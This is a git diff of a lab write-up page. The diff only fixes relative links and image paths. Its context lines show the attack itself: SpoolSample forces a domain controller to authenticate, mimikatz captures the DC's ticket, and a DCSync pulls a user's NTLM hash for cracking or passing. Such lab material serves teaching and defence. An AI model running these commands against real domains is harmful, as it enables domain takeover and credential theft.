@@ -11,7 +11,7 @@ This lab demonstrates an attack on Active Directory Domain Controller \(or any o
 
 This lab builds on:
 
-{% page-ref page="../offensive-security-experiments/domain-compromise-via-unrestricted-kerberos-delegation.md" %}
+{% page-ref page="domain-compromise-via-unrestricted-kerberos-delegation.md" %}
 
 ## Execution
 
@@ -26,7 +26,7 @@ After compiling the amazing PoC [SpoolSample](https://github.com/leechristensen/
 .\SpoolSample.exe dc01 ws01
 ```
 
-![](../.gitbook/assets/screenshot-from-2018-10-31-23-32-34.png)
+![](../../.gitbook/assets/screenshot-from-2018-10-31-23-32-34.png)
 
 We are shown a message that the target attemped authenticating to our compromised system, so let's check if we can retrieve DC01 TGT:
 
@@ -34,7 +34,7 @@ We are shown a message that the target attemped authenticating to our compromise
 mimikatz # sekurlsa::tickets
 ```
 
-![](../.gitbook/assets/screenshot-from-2018-10-31-23-33-49.png)
+![](../../.gitbook/assets/screenshot-from-2018-10-31-23-33-49.png)
 
 We indeed got a TGT for DC01$ computer!
 
@@ -44,7 +44,7 @@ With this, we can make our compromised system `ws01$` appear like a Domain Contr
 mimikatz # lsadump::dcsync /domain:offense.local /user:spotless
 ```
 
-![](../.gitbook/assets/screenshot-from-2018-10-31-23-43-32.png)
+![](../../.gitbook/assets/screenshot-from-2018-10-31-23-43-32.png)
 
 The above clearly shows the attack was successful and an NTLM hash for the user spotless got retrieved -  get cracking or passing it now.
 
